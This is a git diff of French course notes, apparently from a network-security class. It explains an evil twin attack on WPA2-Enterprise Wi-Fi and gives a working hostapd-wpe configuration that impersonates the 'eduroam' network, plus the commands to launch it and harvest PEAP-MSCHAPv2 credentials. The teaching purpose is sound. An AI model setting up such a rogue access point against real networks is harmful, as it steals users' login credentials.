@@ -1,5 +1,58 @@
-
 # L'attaque
+
+## Evil twin
+
+### Principe
+Une attaque de type "evil twin" exploite la façon dont les clients WiFi reconnaissent les réseaux, en se basant principalement sur le nom du réseau (ESSID) sans exiger de la station de base (point d'accès) qu'elle s'authentifie auprès du client. Il s'agit d'une faiblesse de configuration rencontrée dans la majorité des réseaux WPA2-Entreprise, lesquels n'imposent pas aux utilisateurs de contrôler le certificat présenté par le point d'accès pour des raisons de simplicité.
+
+Les points clés sont les suivants de l'attaque sont les suivants :
+
+- **Différenciation difficile** : Il est difficile de différencier un point d'accès légitime d'un point d'accès malveillant lorsque leurs ESSID sont confondus et qu'ils partagent le même mécanisme de sécurité (WPA2-Enterprise dans notre cas). D'autant plus que les réseaux WPA2-Enterprise que l'ont retrouve dans les établissements utilisent souvent plusieurs point d'accès avec le même ESSID pour étendre la courverture de manière transparente pour les utilisateurs finaux.
+- **Itinérance des clients et manipulation des connexions** : Le protocole 802.11 permet aux appareils de passer d'un point d'accès à l'autre au sein d'un même ESS. Il est possible d'exploiter cette possibilité en incitant un appareil à se déconnecter de son point d'accès actuel et à se connecter à un point d'accès malveillant. Il est possible d'y parvenir en offrant un signal plus fort ou en perturbant la connexion au point d'accès légitime en envoyant des paquets de désauthentification ou en le brouillant.
+
+
+### Mise en œuvre
+
+Nous allons configurer le point d'accès malveillant à l'aide de `hostapd-wpe` qui est un correctif de `hostapd` qui permet de réaliser l'attaque "evil twin" et surtout d'obtenir les informations d'identification du client (dont le sujet est traité ci-après) échangés lors de l'authentification (et normalement inaccessibles avec `hostapd` seul).
+
+```bash
+# Installation de hostapd-wpe
+sudo apt install hostapd-wpe
+```
+
+Nous configurons `hostapd-wpe` de la sorte pour qu'il diffuse un point d'accès avec le même ESSID que le réseau cible.
+
+```
+interface=wlan0
+ssid=eduroam
+channel=1
+ignore_broadcast_ssid=0
+eap_user_file=mi-net4104/hostapd-wpe.eap_user
+ca_cert=mi-net4104/attack/ca.pem
+server_cert=mi-net4104/attack/server.pem
+private_key=mi-net4104/attack/server.pem
+private_key_passwd=password
+dh_file=mi-net4104/attack/dh
+eap_fast_a_id=101112131415161718191a1b1c1d1e1f
+eap_server=1
+eap_fast_a_id_info=hostapd-wpe
+eap_fast_prov=3
+ieee8021x=1
+pac_key_lifetime=604800
+pac_key_refresh_time=86400
+pac_opaque_encr_key=000102030405060708090a0b0c0d0e0f
+wpa=2
+wpa_key_mgmt=WPA-EAP
+wpa_pairwise=TKIP CCMP
+```
+
+```bash
+# Lance le point d'accès malveillant
+sudo hostapd-wpe hostapd-wpe.conf -s
+```
+
+
+## MSCHAPv2
 
 Supposons que nous souhaitons nous authentifier auprès d'un réseau Wi-Fi utilisant le protocole PEAP-MSCHAPv2. Pour obtenir les informations d'authentification de d'un utilisateur du réseau cible, diffuser un point d'accès Wi-Fi avec le même SSID que le réseau cible suffit, à condition que les clients tentent de s'y connecter en ne vérifiant pas le certificat CA du serveur d'authentification.
 
